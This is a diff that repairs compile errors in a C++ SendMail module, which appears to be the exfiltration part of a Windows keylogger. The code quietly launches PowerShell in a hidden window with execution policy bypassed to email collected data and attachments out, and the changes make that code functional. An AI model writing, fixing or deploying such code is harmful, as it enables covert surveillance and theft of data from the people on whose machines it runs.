@@ -1,9 +1,9 @@
 #ifndef SENDMAIL_H
 #define SENDMAIL_H
 
-#include <fstring>
+#include <fstream>
 #include <vector>
-#include "widows.h"
+#include <windows.h>
 #include "IO.h"
 #include "Timer.h"
 #include "Helper.h"
@@ -62,8 +62,9 @@ const std::string &PowerShellScript =
             return s;
         size_t sp = 0; //string position de tipo size_t
 
-        while(sp = s.find(what, sp))  != std::string::npos) //mientras no sea igual, continua este loop.
-        s.replace(sp, whayt.length(), with), sp += with.length();
+        while((sp = s.find(what, sp))  != std::string::npos) //mientras no sea igual, continua este loop.
+            s.replace(sp, what.length(), with), sp += with.length();
+        return s;
     }
 
     bool CheckFileExists(const std::string &f)
@@ -92,7 +93,7 @@ const std::string &PowerShellScript =
 
     int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
     {
-        bool = ok;
+        bool ok;
 
         ok = IO::MKDir(IO::GetOurPath(true));
         if(!ok)
@@ -103,9 +104,9 @@ const std::string &PowerShellScript =
         if(!ok)
             return -2;
 
-        std::string param = "-ExcecutionPolicy ByPass -File \"" + src_path + "\" - Subj \"" + StringReplace(subject, "\"", "\\\"")
-                            + "\" -Body \"" + StringReplace(body, "\"", "\\\"" + )
-                            + "\" -Att \"" + attatchments + "\"";
+        std::string param = "-ExcecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \"" + StringReplace(subject, "\"", "\\\"")
+                            + "\" -Body \"" + StringReplace(body, "\"", "\\\"") +
+                            + "\" -Att \"" + attachments + "\"";
 
         SHELLEXECUTEINFO ShExecInfo = {0};
         ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
@@ -114,7 +115,7 @@ const std::string &PowerShellScript =
         ShExecInfo.lpVerb = "open";
         ShExecInfo.lpFile = "powershell";
         ShExecInfo.lpParameters = param.c_str();
-        ShExecInfo.loDirectory = NULL;
+        ShExecInfo.lpDirectory = NULL;
         ShExecInfo.nShow = SW_HIDE;
         ShExecInfo.hInstApp = NULL;
 
@@ -124,16 +125,16 @@ const std::string &PowerShellScript =
             return -3;
         WaitForSingleObject(ShExecInfo.hProcess, 7000);
         DWORD exit_code = 100;
-        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code)
+        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
 
         m_timer.SetFunction([&]()   //lamda function
-                            {
-                                WaitForSingleObject(ShExecInfo.hProcess, 60000);
-                                GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
-                                if((int)exit_code == STILL_ACTIVE)
-                                    TerminateProcess(ShExecInfo.hProcess, 100)
-                                Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
-                            });
+            {
+                WaitForSingleObject(ShExecInfo.hProcess, 60000);
+                GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+                if((int)exit_code == STILL_ACTIVE)
+                    TerminateProcess(ShExecInfo.hProcess, 100);
+                Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
+            });
 
         m_timer.RepeatCount(1L);
         m_timer.SetInterval(10L);
@@ -150,8 +151,9 @@ const std::string &PowerShellScript =
         else{
             for(const auto &v : att)
                 attachments += v + "::";
+            attachments = attachments.substr(0,attachments.length()-2);
         }
-        attatchments = attatchments.substr(0,attachments.length()-2);
+
         return SendMail(subject, body, attachments);
     }
 }
